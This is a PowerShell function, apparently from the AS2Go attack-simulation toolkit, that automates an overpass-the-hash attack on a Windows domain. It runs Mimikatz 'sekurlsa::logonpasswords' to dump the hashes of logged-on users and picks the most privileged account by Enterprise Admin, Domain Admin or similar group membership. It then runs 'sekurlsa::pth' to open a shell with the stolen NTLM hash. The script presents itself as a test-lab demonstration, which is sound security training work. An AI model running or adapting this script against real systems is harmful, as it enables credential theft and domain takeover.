<#
.SYNOPSIS
Runs the AS2Go Overpass-the-Hash (OpTH) attack by reusing a captured NTLM hash on the victim PC.

.DESCRIPTION
Enumerates local administrators and the configured Help Desk group on the victim PC to identify privileged accounts.
Dumps credentials of recently logged-on users on the victim PC with Mimikatz into a session log file.
Confirms the compromised Help Desk user and the captured NTLM hash, and offers corrections before execution.
Launches Mimikatz sekurlsa::pth in a new command window and shows the command required in that window.

.EXAMPLE
Invoke-OverPassTheHashAttack
Runs this workflow using the initialized AS2Go module configuration.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Requires the configured Help Desk user, the stored NTLM hash, and Mimikatz in the module tools folder.
Intended to run on the victim PC where credentials of recently logged-on users can be dumped.

Tested with Get-FileHash -Path $mimikatzPath -Algorithm SHA256 to verify the integrity of the Mimikatz binary.
61C0810A23580CF492A6BA4F7654566108331E7A4134C968C2D6A05261B2D8A1
mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Lists local administrators and the configured Help Desk group to find a privileged account on the victim PC.
Dumps recently logged-on credentials with Mimikatz and confirms the compromised user and NTLM hash.
Launches Mimikatz sekurlsa::pth so the stolen hash yields a Kerberos ticket in a new command window.
#>
function Invoke-OverPassTheHashAttack {
   
    $Info = Measure-FunctionRuntime -Begin

    Update-WindowTitle -NewTitle "Overpass-the-Hash (OpTH) Attack"
    Set-ASConfig -Setting "LastStage" -Value "Overpass-the-Hash (OpTH) Attack"

    If (-not $SkipClearHost) { Clear-Host }

    Write-AS2GoOutput -Type Header -Message "Starting Overpass-the-Hash (OpTH) Attack on VictimPC"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)


    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
    $command = ".\mimikatz.exe  'privilege::debug' 'sekurlsa::logonpasswords' 'exit'"
    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command

 

    $decision = "ExtractNew"

    If (-not $unattended) {


        $message = @"
Please confirm that the following prerequisites are met in the isolated test environment:
  • Credential Guard is not running on the victim PC.
  • LSASS is not running as a protected process (PPL).
  • The credential-extraction tool will run with elevated administrator privileges.
  • Endpoint protection is not expected to interfere with the demonstration.
  • A privileged domain test account has logged on to the victim PC.
  • The test account's NT hash is available or will be obtained during the demonstration.
  • The domain controller is reachable and accepts RC4-HMAC for the test account.
"@

        $title = "Is the Victim PC ready for the Overpass-the-Hash (OpTH) attack?"
        #$message = "Please confirm that the following prerequisites are met in the test enviroment:`n  • Credential Guard / VBS is not running..`n  • Endpoint protection is disabled.`n  • Privileged Account logged on the Victim PC."

        $Options = @(
            [pscustomobject] @{
                Label = "&Yes"
                Help  = "All prerequisites are met. Proceed with the PtH simulation."
                Value = $Script:Yes
            }

            [pscustomobject] @{
                Label = "&No"
                Help  = "The Victim PC is not ready. Skip the PtH simulation."
                Value = $Script:No
            }
        )

        # Default index must stay valid for both cases: last option ("Yes" if present, otherwise "Skip").
        $decision = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title

        if ($decision -eq $Script:No) {
            Measure-FunctionRuntime -End -Details $Info
            return
        }


        $title = "NTLM Hash Availability"
        $message = "Choose whether to reuse a previously extracted NTLM hash, extract one using `nsekurlsa::logonpasswords, or enter one manually for the OpTH simulation."

        $helpPrevious = "Use a previously extracted NT hash for the test account."
        $helpSkip = "Skip the Overpass-the-Hash (OpTH) simulation."


        $ntlmHash = Get-ASConfig -Setting "pthntml"

        if (($ntlmHash.split("|")).count -eq 3) {
            Write-log -Message "Use a previously extracted NTLM hash data: $ntlmHash"
            $helpPrevious = "Use a previously extracted NTLM hash data: $ntlmHash"
        }
        else {
            Write-log -Message 'No valid NTLM hash data found. '
            $helpPrevious = ""
        }


        # $helpPrevious = ""

        if (-not $SafeMode) {

            $Options = @(
                [pscustomobject] @{
                    Label = "&Extract New"
                    Help  = "Run sekurlsa::logonpasswords to attempt to extract the test account's NTLM hash."
                    Value = "ExtractNew"
                }
                [pscustomobject] @{
                    Label = "&Use Previous"
                    Help  = $helpPrevious
                    Value = "UsePrevious"
                }
                [pscustomobject] @{
                    Label = "&Add Manually"
                    Help  = "" #Manually enter the test account's NTLM hash."
                    Value = "AddManually"

                }
                [pscustomobject] @{
                    Label = "&Skip"
                    Help  = $helpSkip
                    Value = $Script:No
                }
            )
        }
        else {
            $Options = @(
                [pscustomobject] @{
                    Label = "&Skip"
                    Help  = $helpSkip
                    Value = $Script:No
                }
            )
        }




        # Default index must stay valid for both cases: last option ("Proceed" if present, otherwise "Skip").
        $decision = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title

        if ($decision -eq $Script:No) {
            Measure-FunctionRuntime -End -Details $Info
            return
        }

    }

    If ($decision -eq "UsePrevious") {

        $temp = $ntlmHash.split("|")
        $Script:ASFQDN = $temp[0]
        $Global:ASHelpDeskUser = $temp[1]
        $Script:ASPtHntml = $temp[2]
    }
    elseif ($decision -eq "ExtractNew") {
    

        $name = get-date -Format 'yyyyMMddhhmmss'
        $CredentialDump = "$($Script:DefautExfiltrationFolder)\$name.log"

        Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe"  `
                "log $CredentialDump" `
                "privilege::debug" `
                "sekurlsa::logonpasswords" `
                "exit" }


        $uniqueResults = @(ConvertFrom-CredentialDump -Unique -Path $CredentialDump)
    
        If ($uniqueResults.Count -eq 0) {
            Write-AS2GoOutput -Type Error -Message "No Security Credentials found in Credential Dump."
            return
        }
        else {
            Write-AS2GoOutput -Type Info -Message "Identified $($uniqueResults.Count) unique principals in Credential Dump."
        }
    

        $BestResults = $uniqueResults |
        ForEach-Object {
            $samAccountName = $_.Username
            $server = $_.LogonServer

            $membership = @(
                Get-ADPrincipalGroupMembership `
                    -Identity $samAccountName `
                    -Server $server |
                Select-Object -Property Name, SID
            )

            $_ | Select-Object `
                Session,
            Domain,
            FQDN,
            UserName,
            NTLM,
            SID,
            LogonTime,
            @{
                Name       = 'GroupMembership'
                Expression = {
                    ($membership | ForEach-Object { $_.Name }) -join ', '
                }
            },
            @{
                Name       = 'GroupMembershipRids'
                Expression = {
                    ($membership | ForEach-Object { $_.SID.Value.split('-')[-1] }) -join ', '
                }
            }
        }



        
        Write-AS2GoOutput -Type H1 -Message "All Principals."
        $BestResults  | Select-Object Domain, Username, NTLM, GroupMembershipRids | out-host

        $BestPrincipal = foreach ($Rid in 519, 512, 548) {
            $MatchForRid = $BestResults | Sort-Object -Property LogonTime -Descending |
            Where-Object {
                $_.GroupMembershipRids -match "(?<!\d)$Rid(?!\d)"
            } |
            Select-Object -First 1

            if ($null -ne $MatchForRid) {
                $MatchForRid
                break
            }
        }

        Write-AS2GoOutput -Type H1 -Message "Best Principal."
        $BestPrincipal | Select-Object Domain, Username, GroupMembership | format-list | out-host
    
        $title = "Select an account for the next step. The recommended account is preselected."
        $message = "Review the group memberships before proceeding. Use Help to see details for the selected account."
        $options = @(New-Helpoptions -InputObject $BestResults -Label 'Username' -Help 'GroupMembership' -Value "IndexOf" -AddSkip)
        $index = [array]::IndexOf($BestResults, $BestPrincipal)

        $SelectedIndex = Show-DecisionPrompt -Message $message -Options $Options -Default $index -Title $title

        If ($SelectedIndex -eq $Script:No) {
            Measure-FunctionRuntime -End -Details $Info
            return
        }

        $Script:ASFQDN = $BestResults[$SelectedIndex].FQDN
        $Global:ASHelpDeskUser = $BestResults[$SelectedIndex].UserName
        $Script:ASPtHntml = $BestResults[$SelectedIndex].NTLM
    
        Write-AS2GoOutput -Type Info -Message "Finished extracting logon sessions from $CredentialDump."
    }
    elseif ($decision -eq "AddManually") {
        $Script:ASPtHntml = Write-AS2GoOutput -Type Input -Message "Manually enter the test account's NTLM hash."
        # Logic for manually adding an NTLM hash
    }





    Write-AS2GoOutput -Type NextCommand -Message "Command:" -NoExtraLines -NoNewLine
    Write-Highlight -Text ".\mimikatz.exe ", """privilege::", "debug", """ ""sekurlsa::", "pth", " /user:", $Global:ASHelpDeskUser , " /ntlm:", $Script:ASPtHntml, " /domain:", $Script:ASFQDN, """ ""exit"""   `
        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
    Write-Host ""

    $answer = Show-DecisionPrompt

    If ($answer -eq $Script:No) {
        Measure-FunctionRuntime -End -Details $Info
        return
    }


    Invoke-Command -ScriptBlock {
        & "$($Script:ASTools)\mimikatz.exe" `
            "privilege::debug" `
            "sekurlsa::pth /user:$Global:ASHelpDeskUser /ntlm:$Script:ASPtHntml /domain:$Script:ASFQDN /run:pwsh.exe" `
            "exit"
    }

    Write-AS2GoOutput -Type Header -Message "Use the New Command Window"
    Write-AS2GoOutput -Type Info -Message "The overpass-the-hash command opened a new command window for the ticket injection."
    Write-AS2GoOutput -Type NextCommand -Message "Please run the following command from the new terminal window" -NoExtraLines
    Write-AS2GoOutput -Type Command -NoExtraLines -Message "00.cmd"

   
    Measure-FunctionRuntime -End -Details $Info
}
